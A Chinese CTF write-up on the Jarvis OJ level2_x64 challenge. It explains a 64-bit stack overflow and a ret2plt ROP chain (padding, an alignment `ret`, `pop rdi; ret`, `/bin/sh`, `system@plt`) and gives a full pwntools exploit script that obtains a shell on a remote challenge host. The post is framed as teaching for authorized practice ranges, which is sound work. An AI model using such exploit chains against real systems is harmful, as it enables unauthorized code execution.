---
title: "Pwn 入门：Jarvis OJ level2_x64——64 位 ret2plt、pop rdi 与栈对齐"
date: 2026-11-18 21:00:00
updated: 2026-11-19 10:00:00
categories:
  - CTF
  - Pwn
  - 栈溢出
tags:
  - Pwn
  - 栈溢出
  - ret2plt
  - ROP
  - pop rdi
  - 栈对齐
  - 64位
  - ROPgadget
  - pwntools
  - Jarvis OJ
description: 64 位、NX、No PIE，程序里刚好有 system@plt 和 /bin/sh。用 128+8 字节覆盖返回地址，接上 pop rdi; ret 把 /bin/sh 送进 RDI，再跳 system@plt。真正卡人的不是 ROP 链本身，而是 system 入口的栈对齐：为什么明明“对齐”了还要多塞一个 ret？
difficulty: 入门
topic: Pwn 入门
series: Pwn 入门
series_order: 7
permalink: 2026/11/18/pwn-ctf-jarvisoj-level2-x64/
---

{% note primary %}
**一分钟速览**

- **难度**：入门（做完前面几道 ret2text、32 位栈传参之后，正好接着练 64 位）
- **考点**：64 位调用约定、ret2plt、ROP gadget、`pop rdi; ret`、栈对齐
- **保护**：No RELRO、No Canary、NX enabled、No PIE、not stripped
- **漏洞**：`read(0, buf, 0x200)`，`buf` 只有 128 字节
- **偏移**：`128 + 8 = 136` 字节到返回地址
- **关键地址**：`system@plt = 0x4004c0`、`pop rdi; ret = 0x4006b3`、`ret = 0x4004a1`、`/bin/sh = 0x600a90`
- **利用链**：`padding` → `ret` → `pop rdi; ret` → `/bin/sh` → `system@plt`
- **结果**：`system("/bin/sh")` 拿到 shell，`cat /flag` 得到 flag
- **flag**：`CTF2{6be1ba77-f842-48d8-a46f-56e822f89224}`
- **思考题**：文中有 8 道，答案默认折叠，建议先自己想一遍
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：栈溢出的基本概念、ret2text、GOT/PLT、pwntools 的 `process` / `remote` / `sendline`。如果还没做过 32 位 ret2text，建议先看 [get_started](/2026/11/10/pwn-ctf-get-started-3dsctf-2016/) 和 [not_the_same](/2026/11/14/pwn-ctf-not-the-same-3dsctf-2016/)。
- **工具**：`file`、`checksec`、IDA、ROPgadget、pwntools、gdb + pwndbg
- **环境**：Linux（Kali / Ubuntu）。文中的靶场地址是当时的临时环境，现在多半已经失效，请换成自己的靶场或本地环境
- 本文所有操作仅用于**授权靶场和本地环境**，请勿对未授权的目标做任何测试
{% endnote %}

{% note default %}
**做题路线**

`file / checksec` → `IDA 看 main` → `进 vulnerable_function 算偏移` → `找 system@plt` → `找 pop rdi; ret 和 /bin/sh` → `画栈图` → `想清楚栈对齐` → `写 exp` → `打远程拿 shell`
{% endnote %}

## 先把程序看明白

这道题需要你灵活运用之前学过的知识完成。

这是一个 64 位的程序。先看文件类型：

![file 和 checksec 的结果](01-checksec.png)

*图 1：64 位 ELF、动态链接、not stripped；保护是 No RELRO / No Canary / NX / No PIE*

`file` 的结果是：

```text
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
BuildID[...], not stripped
```

逐条看：

- **64 位**：参数优先放寄存器，不再像 32 位那样全往栈上压。第一个参数在 `RDI`，这就是后面要找 `pop rdi` 的原因。
- **动态链接**：`system` 的真正代码在 libc 里，程序里只有一个 PLT 跳板。PLT 的地址是固定的，libc 的地址不是。
- **not stripped**：符号表还在，IDA 里能直接看到 `main`、`vulnerable_function`、`system`、`read` 这些名字，省了很多事。

然后看保护：

| 保护 | 结果 | 对我们的影响 |
| --- | --- | --- |
| RELRO | No RELRO | GOT 可写。这题其实用不上，但意味着 GOT 劫持这条路是开着的 |
| Canary | No canary found | 栈溢出不会检查，可以直接覆盖返回地址 |
| NX | enabled | 栈不可执行，不能把 shellcode 塞到栈上执行，只能 ROP |
| PIE | No PIE (0x400000) | 代码段地址固定，IDA 和 ROPgadget 里的地址可以直接写进 payload |
| Stripped | No | 函数名可见，找函数很方便 |

这里要澄清一个容易混的说法：**“栈固定”不等于栈地址固定。** 程序没有 PIE，所以代码段（包括 gadget、PLT、`/bin/sh` 字符串）的地址是固定的；但栈的绝对地址仍然会被 ASLR 随机化。

不过我们根本不需要知道栈在哪。我们只需要控制**栈上的内容**，也就是把返回地址和后面的 ROP 链写进去。栈的绝对地址随机化不影响这一点。

这次 GOT 表确实可改，栈溢出也确实能构造 ROP。但“GOT 可改”是 No RELRO 给的能力，不是这题的最优路线。我们这次不碰 GOT，直接跳到 `system@plt`。

## IDA 里看 main

先用 IDA 打开，按 F5：

![IDA 里的 main](02-main.png)

*图 2：main 先调用 `vulnerable_function`，再 `return system("echo 'Hello World!'")`*

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
    vulnerable_function(argc, argv, envp);
    return system("echo 'Hello World!'");
}
```

两个信息：

1. `vulnerable_function` 被调用了，溢出点就在它里面；
2. main 自己调用了 `system("echo 'Hello World!'")`，所以程序里**一定有 `system@plt`**。

这不是巧合，是出题人留下的“现成函数”。虽然它执行的命令是写死的，我们不能直接拿来用，但它的 PLT 地址可以给我们用。

再看函数列表：

![IDA 函数列表](03-functions.png)

*图 3：函数列表里能看到 `system`、`read`、`vulnerable_function`、`main`*

`system`、`read` 都在，说明动态链接的符号已经导入。`system@plt` 就是那个“跳到 libc 里的 system”的跳板。

### main 的反汇编

![main 的反汇编](04-main-asm.png)

*图 4：注意 `mov edi, 0x4006e0` 和 `call 0x4004c0 <system@plt>`*

```text
0x400620 <+0>:  push rbp
0x400621 <+1>:  mov rbp, rsp
0x400624 <+4>:  sub rsp, 0x10
0x400628 <+8>:  mov DWORD PTR [rbp-0x4], edi
0x40062b <+11>: mov QWORD PTR [rbp-0x10], rsi
0x40062f <+15>: mov eax, 0x0
0x400634 <+20>: call 0x4005f6 <vulnerable_function>
0x400639 <+25>: mov edi, 0x4006e0
0x40063e <+30>: call 0x4004c0 <system@plt>
0x400643 <+35>: leave
0x400644 <+36>: ret
```

重点看这两行：

```asm
mov edi, 0x4006e0          ; 第一个参数 = 字符串地址
call 0x4004c0 <system@plt> ; 调用 system
```

这就是 64 位调用约定的一个现场演示：**第一个参数放 `RDI`（低 32 位是 `EDI`），然后 `call` 函数。**

我们现在要做的事情，本质上就是把这两行“拆开”，用自己的 ROP 链重新拼一遍：

```text
把 /bin/sh 的地址放进 RDI  →  跳到 system@plt
```

main 里是 `mov edi, 0x4006e0`，我们没法直接改这条指令的参数；但我们可以用 `pop rdi; ret` 这个 gadget，从栈上把 `/bin/sh` 的地址弹进 `RDI`。

`system@plt` 的地址也顺便拿到了：`0x4004c0`。脚本里用 `elf.plt['system']` 取到的也是这个值。

这次没有所谓的现成函数，需要自己构造。由于程序是动态链接的，`system` 只有 plt 地址，但是没有关系，因为 `ret` 同样可以跳转到 plt 来调用 `system`。

{% note think **思考 01｜main 里现成的 `system` 调用，为什么不能直接拿来用？** %}
因为它的参数是写死的。main 的反汇编是：

```asm
mov edi, 0x4006e0
call system@plt
```

`EDI`（也就是 `RDI` 的低 32 位）被固定成 `0x4006e0`，指向 `"echo 'Hello World!'"` 这个字符串。我们就算把返回地址改成 `0x400639`，`system` 收到的仍然是这条 echo 命令，不是 `/bin/sh`。

想改参数，要么覆盖 `0x4006e0` 那个字符串（它在 `.rodata` 里，只读，改不了），要么自己用 `pop rdi` 把 `/bin/sh` 的地址放进 `RDI`。所以现成的 `system@plt` 只能用它的**跳板地址**，参数得我们自己给。
{% endnote %}

## 溢出点在哪

![vulnerable_function 的源码](05-vuln-source.png)

*图 5：`buf[128]`，但 `read` 最多读 `0x200` 字节*

```c
ssize_t vulnerable_function()
{
    _BYTE buf[128]; // [rsp+0h] [rbp-80h]

    system("echo Input:");
    return read(0, buf, 0x200uLL);
}
```

这里存在溢出漏洞：

- `buf` 只有 128 字节；
- `read(0, buf, 0x200)` 最多读 512 字节；
- 多出来的 384 字节会往后写，越过 `buf`，覆盖保存的 `rbp` 和返回地址。

`system("echo Input:")` 会在读入之前打印 `Input:`。它有两个作用：

1. 告诉我们 `system@plt` 确实能用；
2. 脚本里可以用 `recvuntil(b"Input:")` 等它打印完再发 payload，时序更稳。

再看反汇编：

![vulnerable_function 的反汇编](06-vuln-asm.png)

*图 6：`lea rax, [rbp-0x80]` 是 buf，`edx=0x200` 是长度，最后 `leave; ret`*

```text
0x4005f6 <+0>:  push rbp
0x4005f7 <+1>:  mov rbp, rsp
0x4005fa <+4>:  add rsp, 0xffffffffffffff80   ; 等价于 sub rsp, 0x80
0x4005fe <+8>:  mov edi, 0x4006d4
0x400603 <+13>: call 0x4004c0 <system@plt>
0x400608 <+18>: lea rax, [rbp-0x80]          ; rax = buf
0x40060c <+22>: mov edx, 0x200               ; 长度 512
0x400611 <+27>: mov rsi, rax                 ; rsi = buf
0x400614 <+30>: mov edi, 0x0                 ; edi = 0，stdin
0x400619 <+35>: call 0x4004d0 <read@plt>
0x40061e <+40>: leave
0x40061f <+41>: ret
```

`add rsp, 0xffffffffffffff80` 看着吓人，其实就是 `sub rsp, 0x80`：加一个负数等于减。`rbp-0x80` 就是 `buf` 的起始地址。

### 128 + 8 是怎么来的

画一下栈：

```text
高地址
+--------------------------+  <- rbp + 8
| 返回地址（ret 要用的）    |  <- 我们要覆盖的地方
+--------------------------+  <- rbp
| 保存的 rbp（8 字节）      |  <- 用 'A' * 8 填掉
+--------------------------+  <- rbp - 0x80
| buf[128]                 |  <- 用 'A' * 128 填掉
| ...                      |
+--------------------------+  <- rbp - 0x80
低地址
```

从 `buf` 开头写到返回地址，需要：

```text
128 字节（buf） + 8 字节（保存的 rbp） = 136 字节
```

所以 `PADDING = 128 + 8`。

注意：**不需要再额外跳过返回地址的 8 字节。** 我们写满 136 字节之后，接下来的 8 字节正好落在返回地址上，那里就是我们第一个 gadget 的地址。如果你写成 128+8+8，反而会越过返回地址，链就对不上了。

`leave` 会把我们写的 `'A' * 8` 弹进 `rbp`，所以 `rbp` 会变成 `0x4141414141414141`。这没关系，因为我们马上 `ret` 到自己的 gadget，之后 `system` 会建自己的栈帧，不会再用这个坏的 `rbp`。

{% note think **思考 02｜为什么偏移是 128+8，而不是 128+8+8？先画一下栈。** %}
`buf` 的范围是 `[rbp-0x80, rbp)`，正好 128 字节。紧接着 `[rbp, rbp+8)` 是保存的 `rbp`，`[rbp+8, rbp+16)` 才是返回地址。

所以：

- 前 128 字节填满 `buf`；
- 接下来 8 字节覆盖保存的 `rbp`；
- 再接下来的 8 字节就落在返回地址上，这里应该放第一个 gadget。

偏移是 136。128+8+8 是“连返回地址也跳过”的写法，那是想覆盖返回地址**后面**的内容时才需要，这题不需要。
{% endnote %}

## 现在开始想：怎么拿 shell

现在不妨开始思考，该怎么获得控制权限。

程序里有 `system`，我们可以通过栈溢出修改返回地址，跳到 `system@plt`。但我们真正想要的是：

```c
system("/bin/sh");
```

光调用 `system` 不够，还得给它传参。64 位下，`system` 的第一个参数放在 `RDI` 里。所以问题变成：

> **怎么让 `RDI` 等于 `/bin/sh` 的地址？**

答案是用 `pop rdi; ret`。

这时你可能还是很奇怪：这到底是什么意思？

### ROP 到底是什么

要彻底理解这个，你需要很好地理解 ROP 攻击的原理到底是什么。

ROP 其实是通过构造一个又一个小的 gadget（类似于函数）来拼出一条调用链。gadget 的特征是：

- 一条简单的汇编指令，后面跟着 `ret`；
- 或者一条简单指令，后面跟着一些**对寄存器没有影响**的指令，最后跟着 `ret`。

然后把 gadget 组合起来。函数每次 `ret`，都会跳到我们构造的下一个 gadget。于是就能自己“构造函数”了。

比如：

```text
[pop rdi; ret]  →  [0x600a90]  →  [system@plt]
```

执行过程是：

1. `ret` 跳到 `pop rdi; ret`；
2. `pop rdi` 从栈上弹出 `0x600a90`，放进 `RDI`；
3. gadget 里的 `ret` 再跳到 `system@plt`；
4. `system` 看到 `RDI = 0x600a90`，也就是 `/bin/sh`。

那这个 gadget 从哪来？

就是从这个程序里面拿到的。程序里的机器码是连续的字节，你可以从任意一个字节开始解释指令。很多看起来正常的指令，从中间某个字节切进去，就会变成另一条指令，最后正好接上一个 `ret`。ROPgadget 就是干这个的：它扫描程序里的 `ret` 字节，再往前反汇编，找出所有能用的 gadget。

{% note think **思考 03｜gadget 为什么必须以 `ret` 结尾？** %}
因为 `ret` 是“把栈顶的值弹进 `RIP`”的指令，也就是把控制权交给下一个地址。没有 `ret`，gadget 执行完就会顺着内存继续往下跑，跑到哪算哪，根本不会回到我们的链上。

gadget 中间可以有一些别的指令，只要它们不影响我们关心的寄存器，并且最后能走到 `ret` 就行。比如 `pop rdi; pop rbp; ret` 也能用，只是会多消耗一个栈槽。

这也是 ROP 能成立的原因：**栈上放的不是代码，而是一串地址；`ret` 负责按顺序消费它们。**
{% endnote %}

### 为什么 NX 开着还能 ROP

NX 的意思是“栈不可执行”，它阻止的是**执行我们写进栈里的机器码**。

ROP 不执行栈上的代码，它执行的是程序里**本来就有的代码**。栈上放的只是这些代码的地址和参数。所以 NX 拦不住 ROP，只能拦住最原始的 ret2shellcode。

同理，程序没有 PIE，所以这些代码地址是固定的；如果开了 PIE，地址每次运行都会变，就得先泄漏一个地址来算基址。

## 找 gadget 和 /bin/sh

现在我们要用 `pop rdi`，先找它的地址：

![ROPgadget 找 pop rdi](07-pop-rdi.png)

*图 7：`0x4006b3 : pop rdi ; ret`*

```bash
ROPgadget --binary ./pwn10 | grep 'pop rdi'
```

拿到：

```text
0x00000000004006b3 : pop rdi ; ret
```

还没完，我们还需要 `/bin/sh` 字符串。如果程序里没给，那就得自己构造。先看看有没有：

![ROPgadget 找 /bin/sh](08-binsh.png)

*图 8：`0x600a90 : /bin/sh`*

```bash
ROPgadget --binary ./pwn10 --string /bin/sh
```

还好这里有，可以直接用：

```text
0x0000000000600a90 : /bin/sh
```

这个地址在程序的数据段里，程序没有 PIE，所以它也是固定的。如果这里没有，我们就得想办法把一个 `/bin/sh` 写进去，或者去 libc 里找——那是后面“没有 `/bin/sh` 怎么办”要讨论的事。

最后还差一个东西：一个普通的 `ret` gadget。

![ROPgadget 找 ret](09-ret.png)

*图 9：`0x4004a1 : ret`，上面还有一个 `0x4005ca : repz ret`*

```bash
ROPgadget --binary ./pwn10 | grep 'ret'
```

```text
0x00000000004005ca : repz ret
0x00000000004004a1 : ret
```

`repz ret` 也能用，但它带一个 `repz` 前缀，有些 CPU 对它有特殊处理。这里直接用最干净的 `ret`：`0x4004a1`。

你可能会问：**`ret` 本身也算 gadget 吗？**

算。它什么都不做，只把栈顶的下一个地址弹进 `RIP`。在这里，它的作用是**把栈指针往后挪 8 字节**，用来解决栈对齐问题。下面马上讲。

## 写脚本前，先捋一捋调用逻辑

先把链子顺一遍：

```text
vulnerable_function
  ret
    ↓
pop rdi; ret          ← 从栈上读一个元素，也就是 /bin/sh 的地址
  ret
    ↓
system@plt            ← 调用 system，参数是 /bin/sh
```

很完美，对吗？？真的吗？思考一下，是不是真的完美了。

问题不在逻辑，而在**栈对齐**。

## 栈对齐：那个多出来的 ret

这里是 64 位系统，一定要注意栈对齐的问题。

先看一个很容易误会的地方。

你可能会说：

> 你看，`call system` 的时候栈刚好对齐了，这不就符合调用函数要栈对齐的要求了吗？

不对。我们说的栈对齐，是 **`system` 内部执行 `sub rsp, xxx` 或者 `push rbp` 的时候，栈是对齐的**，这样它才能安全地分配空间、使用 `movaps` 这类要求 16 字节对齐的指令。

也就是说，**要求的是“进入 system 时”栈的状态，不是“我们链里那条 ret 之前”栈的状态。**

正常 `call` 一个函数时：

```text
call 之前：rsp % 16 == 0
call 指令把返回地址压栈（8 字节）
进入函数时：rsp % 16 == 8
push rbp 之后：rsp % 16 == 0
sub rsp, N 之后：rsp % 16 == 0
```

所以函数内部默认“进来时是 8 mod 16”，`push rbp` 之后就变成 0，可以对齐地分配空间。

但 ROP 是用 `ret` 进入 `system` 的，不是用 `call`：

- `call` 会压一个返回地址；
- `ret` 只会**弹出**一个地址，不会压入任何东西。

所以如果 `ret` 进入 `system` 时 `rsp % 16 == 0`，`system` 一进来就是 0 mod 16，和正常调用时的 8 mod 16 对不上。它内部一旦执行到需要 16 字节对齐的 `movaps`，就会直接段错误。

我们把链子拆开算一下。

### 先看起点

`vulnerable_function` 的函数体里：

```text
push rbp          ; rsp % 16 == 0
mov rbp, rsp      ; rbp % 16 == 0
sub rsp, 0x80     ; rsp % 16 == 0
```

所以 `buf` 的地址是 16 字节对齐的。函数返回时：

```text
leave             ; rsp = rbp，rsp % 16 == 0
pop rbp           ; rsp += 8，rsp % 16 == 8
ret               ; 弹出第一个 gadget 地址，rsp += 8，rsp % 16 == 0
```

也就是说，**`vulnerable_function` 的 `ret` 执行完，进入第一个 gadget 时，`rsp % 16 == 0`。**

### 不加 ret 的情况

如果第一个 gadget 直接是 `pop rdi; ret`：

| 阶段 | `rsp % 16` | 说明 |
| --- | --- | --- |
| 进入 `pop rdi; ret` | 0 | 第一个 gadget |
| 执行 `pop rdi` | 8 | 弹掉 `/bin/sh` 地址 |
| 执行 `ret`，进入 `system` | 0 | ❌ `system` 需要 8 |

`system` 一进来就是 0 mod 16，和正常调用对不上，可能崩在 `movaps`。

### 加一个 ret 的情况

如果第一个 gadget 是一个普通的 `ret`：

| 阶段 | `rsp % 16` | 说明 |
| --- | --- | --- |
| 进入 `ret` gadget | 0 | 第一个 gadget |
| 执行 `ret`，进入 `pop rdi; ret` | 8 | 栈指针后移 8 |
| 执行 `pop rdi` | 0 | 弹掉 `/bin/sh` 地址 |
| 执行 `ret`，进入 `system` | 8 | ✅ `system` 需要 8 |

这才对上了。

所以，**我们还差一个 `ret` 指令**：

```python
payload = b'A' * 136
payload += p64(ret_addr)      # 普通 ret，只为了把 rsp 挪 8 字节
payload += p64(ROP_ADDR1)     # pop rdi; ret
payload += p64(BASH_ADDR)     # /bin/sh 的地址
payload += p64(system_plt)    # system@plt
```

这个 `ret` 什么都不做，唯一的作用就是**调整栈对齐**。它不是在“返回上一层”，而是一个只消耗 8 字节栈空间的空操作。

{% note think **思考 04｜既然 `pop rdi; ret` 之后栈“刚好对齐”，为什么还要多一个 ret？** %}
因为“对齐”要看的是 **`system` 入口**，不是 `pop rdi; ret` 那条 `ret` 之前。

- `vulnerable_function` 的 `ret` 之后，`rsp % 16 == 0`；
- 如果直接进 `pop rdi; ret`：`pop rdi` 后是 8，`ret` 进入 `system` 时又变回 0 —— 错了；
- 如果先过一个普通 `ret`：`ret` 后是 8，进 `pop rdi; ret`；`pop rdi` 后是 0，`ret` 进入 `system` 时是 8 —— 对了。

所以那个多余的 `ret` 不是逻辑需要，是 **ABI 对齐**需要。它把栈指针往后挪了 8 字节，让 `system` 入口的状态和正常 `call` 之后一致。
{% endnote %}

{% note think **思考 05｜为什么 `pop rdi; ret` 后面要跟 `/bin/sh` 的地址，而不是直接跟 `system@plt`？** %}
`pop rdi` 会从栈上弹出一个 8 字节的值放进 `RDI`。所以紧跟 gadget 地址的那个栈槽，必须是**参数**。

执行顺序是：

```text
[pop rdi; ret]   ← ret 跳到这里
[/bin/sh 地址]    ← pop rdi 把它放进 RDI
[system@plt]     ← gadget 里的 ret 跳到这里
```

如果你写成 `[pop rdi; ret] [system@plt] [/bin/sh]`，那么 `RDI` 会变成 `system@plt` 的地址，而 `ret` 会跳到 `/bin/sh` 的字节上，直接崩。

记住顺序：**gadget → 参数 → 函数**。
{% endnote %}

## 写脚本

地址都齐了，写 exp：

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ["tmux", "new-window"]

elf = ELF("./pwn10")

HOST = '2557d9af44f8ad69d73e7b6c.tcp-ctf2.dasctf.com'  # 换成你自己的靶场地址
PORT = 9999

PADDING = 128 + 8

ret_addr = 0x4004a1          # 普通 ret，用来对齐栈
system_plt = elf.plt['system']
BASH_ADDR = 0x600a90         # /bin/sh
ROP_ADDR1 = 0x4006b3         # pop rdi; ret

payload = b'A' * PADDING
payload += p64(ret_addr)
payload += p64(ROP_ADDR1)
payload += p64(BASH_ADDR)
payload += p64(system_plt)

io = remote(HOST, PORT, ssl=True, sni=HOST)

# io.recvuntil(b"Input:")    # 可选：等提示打印完再发，时序更稳
io.sendline(payload)
io.interactive()
```

几个细节：

- `p64()` 把地址打包成 8 字节小端序。64 位一定要用 `p64`，不能用 `p32`。
- `PADDING = 128 + 8`，正好填满 `buf` 和保存的 `rbp`。
- `ret_addr` 放在最前面，先过它，再进 `pop rdi; ret`，用于栈对齐。
- `elf.plt['system']` 拿的是 PLT 跳板地址，不是 libc 里的真实地址。
- `ssl=True, sni=HOST` 是因为这个平台把 TCP 服务包在 TLS 里；如果是普通 TCP，直接 `remote(HOST, PORT)` 就行。
- `recvuntil(b"Input:")` 是可选的：截图里的版本没有加，直接 `sendline` 也能打通；如果担心时序，可以在 `sendline` 前加上它，等提示打印完再发，更稳。

{% note think **思考 06｜为什么 `system@plt` 的地址是固定的，libc 里的 `system` 却不是？** %}
`system@plt` 是程序自己的 `.plt` 段里的一段跳板代码，链接时就确定了地址。程序没有 PIE，所以它固定在 `0x4004c0`。

跳板做的是：

```text
第一次调用：跳 GOT → GOT 里还是解析器的地址 → 解析器找到 libc 的 system
            → 把真实地址写回 GOT
之后调用：  跳 GOT → 直接就是 libc 的 system
```

libc 的加载基址受 ASLR 影响，每次运行都可能不同，所以 libc 里 `system` 的真实地址不固定。但我们不需要它：我们只调用跳板，解析的事交给动态链接器。

这题更省事：`vulnerable_function` 在读入之前已经调用过 `system("echo Input:")`，所以 GOT 早就解析好了。我们跳 `system@plt` 时，它直接走已解析的地址，不会再去解析一次。

`elf.plt['system']` 是跳板地址；`elf.got['system']` 是 GOT 槽的地址，两者不要混。
{% endnote %}

{% note think **思考 07｜payload 里全是 `\x00`，`sendline` 不会把它截断吗？** %}
不会。`read(0, buf, 0x200)` 是**二进制安全**的：它按长度读，不关心字节是什么，`\x00` 和 `\n` 都会原样存进 `buf`。

`p64(0x4004c0)` 是 `\xc0\x04\x40\x00\x00\x00\x00\x00`，这些 `\x00` 会完整地写进栈上，成为 ROP 链的一部分。

如果这里用的是 `gets`、`strcpy` 或 `scanf("%s")`，那才会在 `\n` 或 `\x00` 处停下。`read` 没有这个问题，所以 64 位 ROP 的 payload 可以放心带空字节。

末尾的 `\n` 是 `sendline` 加的，它落在 `system@plt` 地址之后，已经在链子外面了，不影响利用。
{% endnote %}

## 跑一下

```bash
python3 pwn10.py
```

![运行结果](10-run-flag.png)

*图 10：payload 的十六进制、`Input:` 提示、`cat /flag`，以及最终拿到的 flag*

在 `context.log_level = 'debug'` 下，你能看到 payload 的十六进制。对照着看：

| 偏移 | 内容 | 含义 |
| --- | --- | --- |
| `0x00`–`0x87` | `41 41 ...` | 136 字节 `'A'`，填满 `buf` 和保存的 `rbp` |
| `0x88` | `a1 04 40 00 00 00 00 00` | `0x4004a1`，普通 `ret`，用于对齐 |
| `0x90` | `b3 06 40 00 00 00 00 00` | `0x4006b3`，`pop rdi; ret` |
| `0x98` | `90 0a 60 00 00 00 00 00` | `0x600a90`，`/bin/sh` |
| `0xa0` | `c0 04 40 00 00 00 00 00` | `0x4004c0`，`system@plt` |
| `0xa8` | `0a` | `sendline` 追加的换行 |

`0x88` 就是十进制的 136，正好是 `buf` 的 128 字节加上保存的 `rbp` 的 8 字节。这也顺便验证了偏移没算错。

`Sent 0xa9 bytes` 是 169 字节：`136 + 4×8 = 168`，再加上 `sendline` 的 `\n`，正好 169。换行落在 `system@plt` 后面，已经在链子外面，不影响利用。

拿到 shell 之后：

```text
$ cat /flag
CTF2{6be1ba77-f842-48d8-a46f-56e822f89224}
```

## 知识点补充

### 1. 64 位和 32 位传参的区别

| 项目 | 32 位 cdecl | 64 位 SysV |
| --- | --- | --- |
| 前几个参数 | 全部从右往左压栈 | `RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9` |
| 第 7 个起 | 栈 | 栈 |
| 返回值 | `EAX` | `RAX` |
| 地址宽度 | 4 字节，`p32` | 8 字节，`p64` |
| 常见系统调用 | `int 0x80`，`EAX` 存号 | `syscall`，`RAX` 存号 |

这题最直接的差别就是：**32 位要把参数压到栈上，64 位要先把参数放进寄存器。** 所以 32 位的 ret2text 经常是“函数地址 + 返回地址 + 参数”，而 64 位需要先找 `pop rdi; ret` 把参数弹进 `RDI`。

### 2. PLT 和 GOT

| 名称 | 是什么 | 这题里的值 |
| --- | --- | --- |
| `system@plt` | 程序里的跳板代码 | `0x4004c0` |
| `system@got` | 存 libc 真实地址的槽 | 运行时才会填 |
| libc 里的 `system` | 真正的函数实现 | ASLR，每次可能不同 |

调用流程：

```text
call system@plt
  → jmp [system@got]
    → 第一次：GOT 指向解析器，解析器找到 libc 的 system，写回 GOT
    → 之后：GOT 直接指向 libc 的 system
```

所以只要程序导入过 `system`，我们就能用固定的 PLT 地址调用它，不需要泄漏 libc 基址。这叫 **ret2plt**，是 ret2libc 的一个简化版。

![readelf 看重定位](11-readelf.png)

*图 11：`readelf -r` 里的 `.rela.plt`，能看到 `system@GLIBC_2.2.5` 和 `read@GLIBC_2.2.5` 的 `JUMP_SLOT`*

这张图能直接验证前面的说法：`system` 在 `.rela.plt` 里有一条 `JUMP_SLOT` 重定位，说明它是从 libc 动态导入的；GOT 里对应的槽会在运行时被填成 libc 的 `system` 地址。`+ 0` 是加数，不是地址偏移。

### 3. ROP 成立的前提

| 条件 | 这题 | 作用 |
| --- | --- | --- |
| 能控制栈上的内容 | `read` 溢出 | 决定“下一步跳哪” |
| 代码地址固定 | No PIE | 能把 gadget 地址写死 |

NX 不是 ROP 的前提，而是“为什么必须用 ROP”的原因：栈不可执行，shellcode 放不上去，只能复用程序里已有的代码。

如果开了 PIE，gadget 地址会变，需要先泄漏一个代码地址；如果开了 Canary，覆盖返回地址之前要先绕过 Canary；如果开了 Full RELRO，GOT 只读，但 ret2plt 仍然可用（因为我们不写 GOT）。

### 4. 栈对齐的通用判断

记住一个简单的规则：

> **通过 ROP 进入一个 libc 函数时，如果进入函数那一刻 `rsp % 16 == 0`，就在链子最前面加一个 `ret`。**

为什么是加在“最前面”？因为 `ret` 会消耗 8 字节，把后面所有 gadget 的栈位置整体后移 8，从而改变进入 `system` 时的对齐状态。

怎么验证：

- gdb 里在 `system` 入口下断点，`p $rsp & 0xf`；
- 或者直接跑，如果崩在 `movaps` / `system` 附近，先怀疑对齐；
- 加一个 `ret` 再试，能过就是对齐问题。

注意：不是所有 libc 版本都会立刻崩，有些函数也不一定用到 `movaps`。但只要链子“逻辑对、地址对、就是拿不到 shell”，对齐就是第一个要排查的。

### 5. 没有 `/bin/sh` 怎么办

这题比较幸运，程序里直接有 `/bin/sh`。如果没有，常见思路有：

| 方法 | 需要什么 | 难度 |
| --- | --- | --- |
| 用 `read` 写入 `.bss` | 能设置 `RDI` / `RSI` / `RDX` 的 gadget | 中 |
| 泄漏 libc 基址，用 libc 里的 `/bin/sh` | 一个泄漏点 + libc 偏移 | 中 |
| `one_gadget` | libc 版本、满足约束 | 看运气 |
| `execve` 系统调用 | `syscall; ret` + 设置 `RAX`/`RDI`/`RSI`/`RDX` | 高 |

本题的 `/bin/sh` 在 `0x600a90`，直接拿来用就行。

### 6. 怎么验证偏移

除了 IDA 的栈视图，还可以用 gdb + cyclic：

```bash
gdb ./pwn10
pwndbg> cyclic 200
pwndbg> run
# 程序崩溃后
pwndbg> cyclic -l $rsp
```

或者用 pwntools：

```python
from pwn import *
io = process('./pwn10')
io.sendline(cyclic(200))
io.wait()
core = io.corefile
print(cyclic_find(core.read(core.rsp, 8)))
```

这题用 IDA 已经能看得很清楚：`buf` 在 `rbp-0x80`，所以偏移是 `0x80 + 8 = 136`。gdb 只是用来复核。

### 7. 如果保护不一样

| 保护 | 本题 | 如果开了 | 利用会怎么变 |
| --- | --- | --- | --- |
| Canary | 无 | 有 | 需要先泄漏 Canary，或者找不破坏 Canary 的写点 |
| PIE | 无 | 有 | 需要先泄漏代码地址，算基址后再加偏移 |
| NX | 开 | 关 | 可以直接 ret2shellcode，但 ROP 仍然可用 |
| RELRO | No RELRO | Full RELRO | GOT 只读，GOT 劫持失效；ret2plt 仍然可用 |
| ASLR | 系统默认 | 关 / 开 | libc 基址变化；ret2plt 不需要 libc 基址 |

这里再强调一次：**No PIE 只固定了程序本身的地址，不固定栈和 libc。** 我们不需要栈地址，也不需要 libc 地址，所以这题才能这么干净。

{% note think **思考 08｜如果 PIE、Canary、Full RELRO 全开，这题会变成什么样？** %}
三段保护分别加一道新的门槛：

- **Canary 开了**：覆盖返回地址之前会先检查 Canary。我们要么先泄漏 Canary，要么找一个不破坏 Canary 的写点，否则程序会在 `__stack_chk_fail` 里退出。
- **PIE 开了**：`0x4004a1`、`0x4006b3`、`0x4004c0` 这些地址都不再固定，需要先泄漏一个代码地址，算出程序基址，再加偏移。
- **Full RELRO 开了**：GOT 在重定位后变成只读，GOT 劫持不能用了。但 **ret2plt 仍然可用**，因为我们只是调用 PLT 跳板，并没有写 GOT。

所以完整的利用会变成：

```text
泄漏 Canary → 泄漏 PIE 基址 → 泄漏 libc 基址 → 重新算地址 → 再 ROP / ret2libc
```

每多一层保护，就多一次“先泄漏、再计算”的工作。这题三样都没开，所以才能把地址写死，专注于 ROP 链和对齐。
{% endnote %}

## 几个容易踩的坑

| # | 坑 | 现象 | 正确做法 |
| --- | --- | --- | --- |
| 1 | 偏移写成 128 | 第一个 gadget 被写进 saved rbp，返回地址没覆盖到 | 128 + 8 = 136 |
| 2 | 忘了加 `ret` 对齐 | 地址都对，但 `system` 里崩在 `movaps` | 链子最前面加一个 `ret` |
| 3 | 把 `/bin/sh` 字符串本身写进 payload | `RDI` 变成一个无效地址，`system` 读不到字符串 | 写 `/bin/sh` 的**地址** `0x600a90` |
| 4 | 用 `p32` 打包地址 | 地址被截断，跳到错误位置 | 64 位用 `p64` |
